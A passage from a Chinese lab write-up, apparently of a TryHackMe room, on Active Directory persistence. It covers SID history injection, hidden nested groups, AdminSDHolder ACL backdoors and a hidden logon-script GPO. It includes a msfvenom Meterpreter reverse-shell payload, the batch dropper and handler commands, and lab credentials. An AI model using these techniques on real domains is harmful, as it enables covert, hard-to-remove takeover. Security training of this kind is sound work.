历史记录的合法用例是使一个帐户的访问权限能够有效地克隆到另一个帐户。当组织忙于执行 AD 迁移时，这一点非常有用，因为它允许用户在迁移到新域时保留对原始域的访问权限。在新域中，用户将拥有新的 SID，但我们可以将用户现有的 SID 添加到 SID 历史记录中，这仍然允许他们使用新帐户访问先前域中的资源。虽然 SID 历史记录有利于迁移，但我们作为攻击者也可以滥用此功能来实现持久性。 历史可以是我们想要的任何样子 问题是，SID 历史记录并不仅限于包含来自其他域的 SID。有了正确的权限，我们只需将当前域的 SID 添加到我们控制的帐户的 SID 历史记录中即可。关于这种持久性技术的一些有趣的注释： 我们通常需要域管理员权限或同等权限才能执行此攻击。 当帐户创建登录事件时，与该帐户关联的 SID 将添加到用户的令牌中，然后由该令牌确定与该帐户关联的权限。这包括组 SID。 如果我们注入企业管理员 SID，我们可以进一步采取这种攻击，因为这会提升帐户的权限，使其成为林中所有域中的域管理员。 由于 SID 已添加到用户的令牌中，因此即使该帐户不是实际组的成员，也会尊重权限。这使得这是一种非常狡猾的持久方法。我们拥有危害整个域（也许是整个林）所需的所有权限，但我们的帐户可以只是一个普通用户帐户，仅具有域用户组的成员身份。通过始终使用此帐户来更改另一个帐户的 SID 历史记录，我们可以将偷偷摸摸的行为提升到另一个级别，因此初始持久性向量不那么容易被发现和补救。 锻造历史 在下一步中，使用管理员凭据在THMDC上获取一个SSH会话。在伪造SID历史之前，让我们首先获取一些关于SID的信息。首先，确保我们的低权限用户当前没有任何SID历史信息： Your credentials have been generated: Username: louis.cole Password: Password! za\\administrator@THMDC C:\\Users\\Administrator&gt;powershell Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\Administrator&gt; Get-ADUser louis.cole -Properties sidhistory,memberof DistinguishedName : CN=pauline.hargreaves,OU=Sales,OU=People,DC=za,DC=tryhackme,DC=loc Enabled : True GivenName : Pauline MemberOf : {CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=loc} Name : pauline.hargreaves ObjectClass : user ObjectGUID : daa57f4b-cdf8-48a0-8e92-8e03c7b88c54 SamAccountName : pauline.hargreaves SID : S-1-5-21-3885271727-2693558621-2658995185-1121 SIDHistory : {} Surname : Hargreaves UserPrincipalName : 可以看到这里sid历史为空：这证实我们的用户当前没有设置任何 SID 历史记录。让我们获取 Domain Admins 组的 SID，因为这是我们要添加到 SID 历史记录中的组： 我们可以使用 Mimikatz 之类的东西来添加 SID 历史记录。然而，最新版本的 Mimikatz 有一个缺陷，不允许它修补 LSASS 来更新 SID 历史记录。因此我们需要使用其他东西。在这种情况下，我们将使用 DSInternals 工具直接修补 ntds.dit 文件，即存储所有信息的 AD 数据库： Install-Module DSInternals -Force Import-Moduls DSInternals //这里在下载的时候一直报错，不知为何，尝试了半天无果，发现目标机已经有改工具了。。。 Stop-Service -Name ntds -force Add-ADDBSidHistory -SamAccountName 'louis.cole' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath C:\\Windows\\NTDS tds.dit Start-Service -Name ntds NTDS 服务运行时，NTDS 数据库被锁定。为了修补我们的 SID 历史记录，我们必须首先停止该服务。补丁完成后必须重新启动NTDS服务，否则整个网络的认证将无法进行。 执行这些步骤后，让我们使用低权限凭据通过 SSH 登录到 THMWRK1，并验证是否已添加 SID 历史记录以及我们现在是否具有域管理员权限： za\\louis.cole@THMWRK1 C:\\Users\\louis.cole&gt;powershell -ep bypass Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\louis.cole&gt; Get-ADUser louis.cole -Properties sidhistory DistinguishedName : CN=louis.cole,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc Enabled : True GivenName : Louis Name : louis.cole ObjectClass : user ObjectGUID : bf78bdb9-3289-461d-8193-d7fd88d3b23b SamAccountName : louis.cole SID : S-1-5-21-3885271727-2693558621-2658995185-1120 SIDHistory : {S-1-5-21-3885271727-2693558621-2658995185-512} Surname : Cole UserPrincipalName : PS C:\\Users\\louis.cole&gt; dir \\\\thmdc.za.tryhackme.loc\\c$ Directory: \\\\thmdc.za.tryhackme.loc\\c$ Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 9/15/2018 8:19 AM PerfLogs d-r--- 5/11/2022 10:32 AM Program Files d----- 3/21/2020 8:28 PM Program Files (x86) d----- 7/6/2022 4:38 PM tmp da---- 6/30/2022 2:58 PM Tools d-r--- 2/28/2024 10:29 PM Users d----l 4/25/2022 7:11 PM vagrant d----- 7/3/2022 9:51 AM Windows -a---- 1/4/2022 7:47 AM 103 delete-vagrant-user.ps1 -a---- 5/1/2022 9:11 AM 169 dns_entries.csv -a---- 7/3/2022 6:05 PM 7168 shell.exe -a---- 5/1/2022 9:17 AM 1725 thm-network-setup-dc.ps1 根据上面的输出，效果很好！我们能够伪造我们的 SID 历史记录，授予我们的低特权帐户 DA 访问权限！ 蓝队的干草叉和火把 如果蓝队通过RDP访问域内主机并使用AD用户和组管理单元，那么蓝队将能够查看添加到当前AD用户的SID历史记录属性；但是，即使蓝队具有最高权限，也无法通过GUI界面直接删除AD用户的SID历史记录属性，因为它是受保护的。 为了成功删除攻击者所添加的SID历史记录，蓝队必须使用诸如AD-RSAT PowerShell cmlet之类的工具；此外，蓝队还必须先找到攻击者所修改的SID历史记录，这需要蓝队成员主动过滤并查看用户的相关属性，否则很难找到恶意的SID 历史记录，因为只有在用户进行身份验证时才会应用和使用这些SID历史记录。 想象一下，您是蓝队，正在处理刚刚执行域名回收的事件。您将 krbtgt 帐户的密码轮换了两次，删除了金票和银票，并从头开始重建了整个 CA 服务器，只是为了看到攻击者仍在使用低权限帐户执行 DA 命令。这不会是美好的一天。 0x06 通过组成员身份实现持久性 如果我们不想篡改SID历史记录，我们可以直接将自己添加到AD组中以实现持久化。虽然 SID 历史记录是一种很好的持久性技术，但凭证轮换和清理仍然可以消除我们的持久性。在某些情况下，通过针对 AD 组本身来执行持久性可能会更好。 通过团体成员身份坚持下去 如任务1所讨论的那样，最高权限的帐户或组并不总是用于持久性的最佳选择。比其他组更密切地监视了特权组的变化。任何被归类为受保护组的组，例如域管理员或企业管理员，都会接受额外的安全审查。因此，如果我们想通过组成员身份持久存在，我们可能需要在将我们自己的帐户添加到持久性的组时进行创造性的考虑： IT Support组可用于获取诸如强制更改用户密码之类的特殊权限，尽管在大多数情况下，我们可能无法重置特权用户的密码，但是我们能够尝试重置低特权用户的密码并继续将访问权限扩展到目标工作站。 目标域网络所提供的具有本地管理员权限的组通常不会像被保护组那样被密切监控，我们可以通过修改组成员关系，来拥有对目标主机的本地管理员权限。 此类权限维持技术并不总是与直接的特权有关，有时，具有间接特权(例如对组策略对象的所有权)的组也同样适合我们用来实现权限维持。 Nested Groups(嵌套组) 在大多数企业网络环境中，都存在大量的递归组。递归组是指某个组是另一个组的成员，我们可以认为这是组嵌套(group nesting)，这种组嵌套可用于在AD域网络中创建更有组织性的结构。 以IT Support(技术支持)组为例，IT Support是一个通用的组，因此，在这个组下面可能会有像Helpdesk、Access Card Managers和Network Managers这样的子组；我们可以将所有这些组作为成员添加到IT Support组中，这将为子组中的所有用户分配与IT Support组相关联的权限和特权，同时我们还可以为每个子组分配更细致的权限和特权。 虽然组嵌套有助于组织AD域网络，但是它确实降低了关于那些具有有效访问权限的AD帐户的可见性。再次以IT Support组为例，如果我们向AD域查询IT Support组的成员，它可能会告诉我们该组有三个成员，然而，这个数字并不真实，因为IT Support组中的三个成员也可以是组。为了更充分地了解具有有效访问权限的帐户数量，我们还必须继续枚举IT Support组中的子组，但是这些子组本身也可以有子组作为成员。那么问题最终就变成了:“我们应该枚举多少层，才能得到真正的具有有效访问权限的AD帐户数目?”(这里的有效访问权限是指由于组成员关系而分配给某个AD帐户的权限) 多层组嵌套关系也会让蓝队更加难以监控权限分配情况，假设当一个新成员被添加到Domain Admins组时会向蓝队发出警报，这是一个很好的警报，但是如果攻击者将用户添加到Domain Admins组中的子组中，则可能并不会触发该警报。这是一个非常常见的问题，因为AD是由AD团队管理的，而警报和监控则是由InfoSec(信息安全)团队管理的；我们作为攻击者所需要的是以上两个团队之间存在一些沟通上的错误，那么当我们使用子组进行用户添加时，就不会有警报消息被发送给蓝队。 作为攻击者，我们可以利用这种被降低的权限分配可见性来尝试执行权限维持操作。我们可以不将目标直接锁定在那些能让我们访问AD域的特权组上，而是转而把注意力集中在子组上，也就是说：我们不添加直接新成员到那些可能会向蓝队发出警报的特权组中，而是将低权限的用户添加到可能未被监控的那些子组中。 基于嵌套组实现权限维持 我们首先使用administrator帐户通过SSH登录到跳板主机，然后创建一个新的基础组，并且将该组隐藏在People-&gt;IT OU(组织单元)中： PS C:\\Users\\Administrator.ZA&gt;New-ADGroup -Path \"OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"hybcx Net Group 1\" -SamAccountName \"hybcx_nestgroup1\" -DisplayName \"hybcx Nest Group 1\" -GroupScope Global -GroupCategory Security 然后让我们在People-&gt;Sales OU(组织单元)中创建另一个组，并且将我们刚才的基础组作为组成员添加进来： PS C:\\Users\\Administrator.ZA&gt;New-ADGroup -Path \"OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"hybcx Net Group 2\" -SamAccountName \"hybcx_nestgroup2\" -DisplayName \"hybcx Nest Group 2\" -GroupScope Global -GroupCategory Security PS C:\\Users\\Administrator.ZA&gt;Add-ADGroupMember -Identity \"hybcx_nestgroup2\" -Members \"hybcx_nestgroup1\" 我们重复执行几次上述两个步骤，每次都将前一个组添加为新的组的成员： PS C:\\Users\\Administrator.ZA&gt; New-ADGroup -Path \"OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"hybcx Net Group 3\" -SamAccountName \"hybcx_nestgroup3\" -DisplayName \"hybcx Nest Group 3\" -GroupScope Global -GroupCategory Security PS C:\\Users\\Administrator.ZA&gt; Add-ADGroupMember -Identity \"hybcx_nestgroup3\" -Members \"hybcx_nestgroup2\" PS C:\\Users\\Administrator.ZA&gt; New-ADGroup -Path \"OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"hybcx Net Group 4\" -SamAccountName \"hybcx_nestgroup4\" -DisplayName \"hybcx Nest Group 4\" -GroupScope Global -GroupCategory Security PS C:\\Users\\Administrator.ZA&gt; Add-ADGroupMember -Identity \"hybcx_nestgroup4\" -Members \"hybcx_nestgroup3\" PS C:\\Users\\Administrator.ZA&gt; New-ADGroup -Path \"OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC\" -Name \"hybcx Net Group 5\" -SamAccountName \"hybcx_nestgroup5\" -DisplayName \"hybcx Nest Group 5\" -GroupScope Global -GroupCategory Security PS C:\\Users\\Administrator.ZA&gt; Add-ADGroupMember -Identity \"hybcx_nestgroup5\" -Members \"hybcx_nestgroup4\" #上述组名自定义即可 现在让我们将上述所创建的最后一个组添加到域管理员组： PS C:\\Users\\Administrator.ZA&gt; Add-ADGroupMember -Identity \"Domain Admins\" -Members \"hybcx_nestgroup5\" 最后，我们将低权限的AD用户添加到我们先前所创建的第一个组中： #PS C:\\Users\\Administrator.ZA&gt;Add-ADGroupMember -Identity \"hybcx_nestgroup1\" -Members \"&lt;low privileged username&gt;\" PS C:\\Users\\Administrator.ZA&gt;Add-ADGroupMember -Identity \"hybcx_nestgroup1\" -Members \"louis.cole\" 完成上述操作之后，我们的低权限AD用户将获得针对THMDC(目标域控)机器的访问特权，我们可以使用该低权限用户通过SSH访问THMWRK1跳板主机并执行相关命令来验证这一点： za\\chloe.potter@THMWRK1 C:\\Users\\chloe.potter&gt;dir \\\\thmdc.za.tryhackme.loc\\c$\\ Volume in drive \\\\thmdc.za.tryhackme.loc\\c$ is Windows Volume Serial Number is 1634-22A9 Directory of \\\\thmdc.za.tryhackme.loc\\c$ 01/04/2022 07:47 AM 103 delete-vagrant-user.ps1 05/01/2022 08:11 AM 169 dns_entries.csv 09/15/2018 07:19 AM &lt;DIR&gt; PerfLogs 05/11/2022 09:32 AM &lt;DIR&gt; Program Files 03/21/2020 08:28 PM &lt;DIR&gt; Program Files (x86) 07/03/2022 05:05 PM 7,168 shell.exe 05/01/2022 08:17 AM 1,725 thm-network-setup-dc.ps1 07/06/2022 03:38 PM &lt;DIR&gt; tmp 06/30/2022 01:58 PM &lt;DIR&gt; Tools 02/28/2024 10:29 PM &lt;DIR&gt; Users 04/25/2022 06:11 PM &lt;SYMLINKD&gt; vagrant [\\\\vboxsvr\\vagrant] 07/03/2022 08:51 AM &lt;DIR&gt; Windows 4 File(s) 9,165 bytes 8 Dir(s) 51,539,042,304 bytes free 回到我们之前使用administrator帐户所建立的SSH会话界面，我们还可以验证一下，即使我们创建了多个组，域管理员组也只有一个新成员： PS C:\\Users\\Administrator.ZA&gt; Get-ADGroupMember -Identity \"Domain Admins\" distinguishedName : CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=loc name : Administrator objectClass : user objectGUID : 0bbd7980-b53b-4634-8a28-57e4234655c2 SamAccountName : Administrator SID : S-1-5-21-3885271727-2693558621-2658995185-500 distinguishedName : CN=matthew.williams,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC= loc name : matthew.williams objectClass : user objectGUID : c4f5743a-c362-49c5-b95c-5ec2a33bf480 SamAccountName : matthew.williams SID : S-1-5-21-3885271727-2693558621-2658995185-1114 distinguishedName : CN=Am0 Net Group 5,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc name : Am0 Net Group 5 objectClass : group objectGUID : ba545574-6af9-4a3d-a8df-24ab582fc04c SamAccountName : am0_nestgroup5 SID : S-1-5-21-3885271727-2693558621-2658995185-6163 distinguishedName : CN=timtaylor Net Group 5,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc name : timtaylor Net Group 5 objectClass : group objectGUID : c7df8bd5-d8ed-44a6-9ec2-375935db3c83 SamAccountName : timtaylor_nestgroup5 SID : S-1-5-21-3885271727-2693558621-2658995185-6168 distinguishedName : CN=hybcx Net Group 5,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc name : hybcx Net Group 5 objectClass : group objectGUID : bcf18156-2091-4b3d-89cc-fefae53893fd SamAccountName : hybcx_nestgroup5 SID : S-1-5-21-3885271727-2693558621-2658995185-6610 虽然这里很多组成员，但这是由于这个靶机是共享的，我们只需要关注之中的hybcx Net Group 5只有这一个 烦人的不仅仅是蓝队 如果是在现实的企业网络环境中，我们不必创建新的组来进行组嵌套，实际上，我们完全可以利用现有的组来执行组嵌套操作；然而，这是我们在正常的红队评估行动中永远不会做的事情，因为这种组嵌套操作会破坏企业组织的AD域网络结构，如果这种破坏足够充分，那么AD域网络结构将无法恢复。 这意味着：即使蓝队能够将我们所获得的权限取消，企业组织也很可能需要从头开始重建他们的整个AD网络结构，这将会造成企业的重大损失。 0x07 通过ACL进行持久化 有时候，我们可能不仅仅想要通过正常的AD组来实现权限维持，而是希望基于所有受保护的组来进行权限维持。 使用AD组模板 虽然我们可以向我们所能找到的每个特权组添加一个受我们控制的AD帐户，但是蓝队仍然可以执行相关的清理操作并删除我们所添加的组成员。为了确保更好进行权限维持，我们可以尝试注入模板以生成默认组，通过对这些模板执行注入操作，即使蓝队删除了我们所添加的组成员，我们也只需要等待模板刷新，然后我们就能再次让我们所控制的AD帐户获得组成员资格。 一个我们可用的模板是AdminSDHolder容器。该容器存在于每个AD域中，我们能够以其ACL(Access Control List-访问控制列表)为模板，从而将权限复制到所有的受保护组中。常见的受保护组包括Domain Admins、Administrators、Enterprise Admins、Schema Admins等特权组。如果想要查看关于受保护组的完整列表，可以访问以下链接： https://learn.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10) 一个名为SDProp的进程能够获取AdminSDHolder容器的ACL，并可以每60分钟将其应用于所有受保护组；因此，我们可以基于此进程编写一个ACE(访问控制条目)，它将授予我们对于所有受保护组的完全权限。如果蓝队没有意识到这种类型的权限维持技术正在被使用，那么他们将很难完全清除攻击者所获得的权限。因为，即使蓝队删除了那些基于受保护对象或者组的不恰当的权限之后，相关的权限仍然会在一个小时内被重新分配。由于这种重新授权是通过正常的AD过程来进行的，因此这种操作也不会让蓝队收到任何警报提示，这会让蓝队更加难以确定这种持久化权限的来源。 使用AdminSDHolder容器(修改其ACLs)实现权限维持 为了基于AdminSDHolder容器来进行权限维持操作，我们还将使用Microsoft管理控制台(MMC-Microsoft Management Console)。我们首先会使用上文所提及的低权限的AD帐户来通过RDP访问跳板主机THMWRK1，然后在跳板机的终端中使用runas命令注入管理员凭据到当前会话中并启动另一个终端程序，最后我们将从此新终端启动MMC： xfreerdp /d:za.tryhackme.loc /u:'grace.clarke' /p:'Password1' /v:thmwrk1.za.tryhackme.loc /cert:ignore +clipboard C:\\Users\\chloe.potter&gt; runas /netonly /user:thmchilddc.tryhackme.loc\\Administrator cmd.exe #Password:tryhackmewouldnotguess1@ #在新终端界面中执行以下命令 C:\\Windows\\system32&gt; mmc.exe #这能让我们以管理员用户身份成功访问到域控制器上的MMC控制台 成功打开MMC窗口之后，我们向其添加“Users and Groups用户和组”管理单元(File-&gt;Add/Remove Snap-in-&gt;Active Directory Users and Computers)，并且选中目标域以启用高级功能(View-&gt;Advanced Features)，然后我们就可以在Domain-&gt;System下面找到AdminSDHolder组： 我们继续导航到该组的Security 属性(右键单击AdminSDHolder-&gt;Properties-&gt;Security)： 让我们在上述界面中添加我们所控制的低权限AD用户，并且授予其完全控制(Full Control)权限： 点击Add(添加)。 搜索我们所能使用的低权限AD用户名称(例如chloe.potter)，然后点击Check Names(检查名称)。 点击OK。 选择Full Control(完全控制)并点击Allow(允许)。 点击Apply(应用)。 点击OK。 添加成功之后，具体结果将如下所示： 手动启动SDProp进程 正常情况下，我们可能需要等待60分钟，然后我们所添加的低权限用户将能够完全控制所有的受保护组。这是因为安全描述符传播器(SDProp)服务每60分钟会自动执行一次，并且它会将我们所更改的ACL(访问控制列表)传播到所有的受保护组。 tips：SDProp的全称为Security Descriptor Propagator(安全描述符传播器)。 由于等待时间过长，我们将使用Powershell命令来手动启动该进程，我们可以在C:\\Tools\\目录下找到并使用脚本Invoke-ADSDPropagation来手动启动上述所提及的SDProp进程： #使用rdp访问域控制器 xfreerdp /d:za.tryhackme.loc /u:'administrator' /p:'tryhackmewouldnotguess1@' /v:THMDC.za.tryhackme.loc /cert:ignore +clipboard # Enter a PowerShell session # Now running a PowerShell session on the domain controller... #PS C:\\Tools&gt; Import-Module .\\Invoke-ADSDPropagation.ps1 #PS C:\\Tools&gt; Invoke-ADSDPropagation cd C:\\Tools dir Import-Module C:\\Tools\\Invoke-ADSDPropagation.ps1 Invoke-ADSDPropagation #不通过RDP的方法，即使用上述runas注入命令所启动的cmd.exe #powershell -ep bypass # WinRM to the domain controller as the DA #Enter-PSSession -ComputerName thmdc.za.tryhackme.loc # Now running a PowerShell session on the domain controller... #Import-Module C:\\Tools\\Invoke-ADSDPropagation.ps1 #Invoke-ADSDPropagation 完成上述操作后，大概等待一分钟左右，然后继续使用上文中的MMC控制台检查受保护组(如Domain Admins组)的安全权限： 我们可以看到，我们的低权限AD用户对于Domain Admins组具有完全控制权限，我们可以从DA组的安全权限属性中删除低权限AD用户并重新运行PowerShell脚本来验证我们之前所修改的模版组的ACL将继续传播，而且我们的低权限用户将会被再次添加到Domain Admins组的ACL中。有趣的是，虽然我们有权限修改DA组，但是它并不会自动将我们的低权限AD用户(例如grace.clarake)添加到组成员列表中： 我们可以使用我们所被分配的新权限，将对应的低权限AD用户(例如grace.clarke)作为组成员添加到DA组中： 然后验证低权限用户的可用特权：（这里不知道为何验证不成功） 成功实例： 我的示例： tips：在手动启动SDProp进程之后，我们也可以通过之前的RDP界面(用于低权限AD用户访问跳板主机的RDP，见上文)执行PowerShell命令来向受保护组(例如DA组)手动添加组成员。 Add-ADGroupMember -Identity 'Domain Admins' -Members 'grace.clarke' Get-ADGroupMember -Identity 'Domain Admins' | Where-Object {$_.SamAccountName -eq 'grace.clarke'} dir \\\\thmdc.za.tryhackme.loc\\C$\\Users 上述的方法我依旧不成功。。。 蓝队正在走下坡路 我们可以将本小节的权限维持技术与上一小节中的组嵌套技术结合起来。即使蓝队通过更改大量的组撤销了我们所获得的访问权限，但是在60分钟后，我们仍然可以重新被自动分配权限。除非蓝队知道我们所获得的权限是通过修改AdminSDHolder组而来的，否则蓝队每隔60分钟就会感到头疼。 由于这种权限维持是通过合法的AD服务来传播实现的，因此每次发生上述自动分配权限的情况时，蓝队都难以找到真正的问题所在。我们还可以将完全控制权限授予AdminSDHolder模版组中的Domain Users(域用户)组，这意味着任何低权限AD用户都将被授予对于所有的受保护组的完全控制权限。此外，我们还可以将此项技术与完整的DC同步攻击相结合，这意味着蓝队还需要重置目标AD域中的每个凭据以尝试彻底清除我们所获得的权限。 0x08 通过GPO实现持久化 GPO，即组策略对象，它可以被用于帮助我们执行AD枚举、AD攻击或者AD利用等技术，同时，它也可以被用于实现域权限维持。 AD域中的组策略管理(GPM)能够提供一种集中的机制来管理所有域内机器的本地策略配置，包括对受限制组的成员关系、防火墙程序、反病毒程序等功能的配置，以及配置主机启动时应该执行哪些脚本。虽然GPM是一个很好的管理工具，但是攻击者也可能会针对GPM以便在目标AD域中实现权限维持，更糟糕的是，攻击者还可以隐藏恶意的GPO，以至于蓝队难以将恶意的GPO删除。 介绍 以下是一些常见的基于GPO的权限维持技术： 配置受限制组的成员关系：这将允许我们以管理并访问域内的所有主机。 部署登录脚本：这将确保每次AD用户对域中的主机进行身份验证时(如AD用户的登录操作)，我们都会得到一个shell回调。 我们在本小节中会重点关注上述第二种权限维持技术，虽然能够访问所有域内主机是件好事，但是如果能够确保我们以管理员权限来访问这些主机，那就更好了。为此，我们将创建一个链接到Admins OU(组织单元)的GPO，这将允许我们在AD用户每次对域内主机进行身份验证时能够获得相关的shell。 前期准备工作 在我们创建GPO之前，我们首先需要生成shell文件、设置端口侦听器以及编写能够执行shell的bat文件。我们可以使用以下命令来生成一个可执行的shell文件： msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=5555 -f exe &gt; hybcx_shell.exe 接下来，我们还需要创建一个批处理脚本，此脚本会在AD用户登录主机时在目标系统上运行，该脚本将执行以下操作： 将有效载荷文件(即上面所生成的shell文件)从域控制器(DC)上的SYSVOL目录复制到AD用户的计算机上的临时目录下； 等待20秒并完成shell文件的复制； 执行有效载荷文件，生成反向shell。 bat脚本(my_script.bat)的内容如下所示： #在攻击机上创建一个bat脚本(nano my_script.bat)，内容如下所示： copy \\\\za.tryhackme.loc\\sysvol\\za.tryhackme.loc\\scripts\\hybcx_shell.exe C:\\tmp\\hybcx_shell.exe &amp;&amp; timeout /t 20 &amp;&amp; C:\\tmp\\hybcx_shell.exe tips：Windows允许我们通过登录GPO执行Batch(批处理)或PowerShell脚本，但是批处理脚本通常比PowerShell脚本更稳定。 我们可以使用scp命令以及上文所提供的Administrator用户凭据，将上述两个文件上传到目标DC的SYSVOL目录中： #在攻击机上操作 root:~$ scp hybcx_shell.exe za\\\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/ root:~$ scp hybcx_script.bat za\\\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/ #用户名：administrator #密码：tryhackmewouldnotguess1@ 最后，我们还需要在攻击机上设置MSF端口侦听器： root:~$ msfconsole -q -x \"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.58.47; set LPORT 5555;exploit\" [*] Using configured payload generic/shell_reverse_tcp payload =&gt; windows/x64/meterpreter/reverse_tcp LHOST =&gt; persistad LPORT =&gt; 4445 [*] Started reverse TCP handler on 10.50.84.147:4445 创建GPO 现在，我们的准备工作已经完成，接下来我们需要创建GPO，我们将通过RDP连接到跳板主机THMWRK1，并使用runas命令注入管理员凭据以启动MMC控制台。这部分内容可以参考上一小节的操作步骤： #在攻击机上另启一个终端 xfreerdp /d:za.tryhackme.loc /u:'chloe.potter' /p:'Marisa2014' /v:thmwrk1.za.tryhackme.loc /cert:ignore +clipboard runas /netonly /user:thmchilddc.tryhackme.loc\\Administrator cmd.exe #用户名：administrator #密码：tryhackmewouldnotguess1@ mmc.exe 在MMC控制台中选择File &gt; Add/Remove Snap-ins，并添加Group Policy Management(组策略管理)单元： 这里我点击OK之后总是报错，说是不能联系上对应的DC控制器，这里没办法，我就直接照搬看思路了 在本小节中，我们将编写一个会被应用到所有管理员的GPO，我们先右键点击GPM中的Admins OU，然后选择在当前域中创建GPO以完成链接。我们可以指定一个名称给我们所创建的GPO，如username - persisting GPO： tips：从技术上讲，我们也可以将恶意内容写入上图中的默认域策略(Default Domain Policy)，该策略能够被传播给所有的AD对象。 右键单击我们所创建的GPO并选择Enforced(强制执行)，这将确保我们的策略被应用(即使存在策略冲突，这也能让我们的策略更加优先)： 右键单击上述恶意策略并选择编辑： 在用户配置(User Configuration)下展开Policies-&gt;Windows Settings； 选择Scripts (Logon/Logoff)； 右键单击Logon-&gt;Properties； 选择Scripts选项卡； 单击Add-&gt;Browse。 导航到我们存储shell文件以及批处理文件的目录： 我们选择批处理文件作为脚本，并点击“打开”和“确认”选项，然后继续点击“应用”和“确认”。这将确保每次管理员组(tier 2, 1, and 0)中的成员登录到任何计算机时，我们都会在攻击机上收到一个反向shell回调。 我们将通过模拟管理员用户登录来完成刚才所提及的shell回调过程，为此，我们将重置属于管理员组的某个用户的密码以便我们使用密码模拟登录，我们仍然需要使用上述的MMC控制台，但是这次我们将添加Active Directory Users and Computers管理单元。 选择一个管理员用户并右键单击，然后选择“重置密码…”： 注意：我们需要为上述恶意GPO创建一个Logon(登录)事件，所以我们还需要确保注销我们上文中用于创建恶意GPO的RDP会话，注销过程将如下所示。 现在，让我们使用已经修改了密码的管理员用户身份通过RDP访问thmserver1目标机器，这将触发登录事件： xfreerdp /v:thmserver1.za.tryhackme.loc /u:'t1_eileen.burton' /p:'Strong.Password123' /cert:ignore +clipboard #使用我们所设置的新密码进行登录 然后我们将在攻击机上的端口监听器上接收到一个反向shell连接： msf5 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 10.50.84.147:4445 [*] Sending stage (176195 bytes) to 172.31.1.201 [*] Meterpreter session 1 opened (10.50.84.147:4445 -&gt; 172.31.1.201:63695) at 202x-05-07 10:06:28 +0100 meterpreter &gt; 隐藏GPO 我们不希望蓝队能够修改或删除我们所创建的恶意GPO，这会破坏我们所建立的持久性权限，因此我们可以在thmwrk1跳板主机上打开MMC控制台，并尝试隐藏我们刚才所创建的GPO。 xfreerdp /d:za.tryhackme.loc /u:'chloe.potter' /p:'Marisa2014' /v:thmwrk1.za.tryhackme.loc /cert:ignore +clipboard runas /netonly /user:thmchilddc.tryhackme.loc\\Administrator cmd.exe mmc.exe 单击“委派”选项卡： 在默认情况下，所有管理员都可以编辑我们上文所创建的GPO，所以让我们删除这些权限： 右键单击ENTERPRISE DOMAIN CONTROLLERS (企业域控制器)，然后选择Edit settings, delete, modify security； 单击所有其他组(经过身份验证的用户除外)，然后单击删除。 最后的委派内容将如下所示： 单击恶意GPO的安全设置中的高级选项并从权限中删除Created Owner： tips：在默认情况下，所有通过身份验证的用户都必须具有读取策略的权限，否则，当AD用户进行身份验证以应用用户策略时，将无法读取策略。如果我们没有部署登录脚本，我们就可以尝试删除此权限，以确保几乎没有人能够读取我们的策略。 接下来，我们可以将Authenticated Users替换成Domain Computers，以确保计算机可以读取和应用我们的恶意策略，但是同时我们还要阻止任何AD用户去读取恶意策略(我们需要提前测试一下反向shell回调能够正常进行，因为我们接下来的操作会使得用户无法读取PowerShell脚本)： 在恶意GPO的安全设置中单击添加； 输入Domain Computers，然后点击Check Names并继续点击OK； 选择Read permissions并确认； 点击选中Authenticated Users并进行删除。 执行上次步骤之后，我们将立即收到一个错误提示，告诉我们无法再读取策略： 通过执行上述操作，我们可以确保蓝队无法轻易删除我们所创建的恶意GPO，除非他们选择模拟域控制器的计算机帐户。 0x09 总结 我们可以通过几种不同的方式来实现域权限维持，其中的一些技术会比其他技术更加具有隐蔽性和有效性。为了确保我们所执行的权限维持设置不会被蓝队移除，我们必须创造性地思考怎么进行权限维持。 此外，我们不应该等到整个目标AD域都被渗透之后再考虑进行权限维持，实际上，在每一轮的横向移动和权限提升操作之后，我们就应该尝试进行域权限维持。 其他域权限维持技术 在本文的实验网络环境中，我们介绍了几种可用于在AD域中实现权限维持的技术；但是，我们目前所介绍的权限维持技术绝不是一个详尽的清单。下面是其他一些值得被提及的域权限维持技术： Skeleton keys：使用Mimikatz，我们可以部署万能钥匙(skeleton key)，该万能钥匙可用于模拟模板AD域中的任何帐户；Mimikatz会创建一个默认密码，并将其适用于目标AD域中的任何帐户，但是原先的普通密码仍然有效，因此防御者很难知道这种攻击已经发生。 Directory Service Restore Mode (DSRM)：每个域控制器中都有一个被称为DSRM的内部可用的管理员帐户，DSRM帐户的密码将在服务器升级为DC时设置，并且很少会发生修改，该密码能够用于在紧急情况下恢复DC；而攻击者可以使用Mimikatz来提取DSRM帐户的密码，并使用此密码获得针对目标AD环境中的域控制器(DC)的管理及访问权限。 Malicious Security Support Provider (SSP)：利用SSP接口，我们可以将Mimikatz的mimilib添加为新的SSP，这会将目标域中的所有身份验证尝试的凭据都记录到一个日志文件中；我们可以指定用于日志记录的网络位置，这将允许mimilib把我们的凭据发送给被入侵的域内主机并进行身份验证，从而为我们提供持久化的访问权限。 Computer 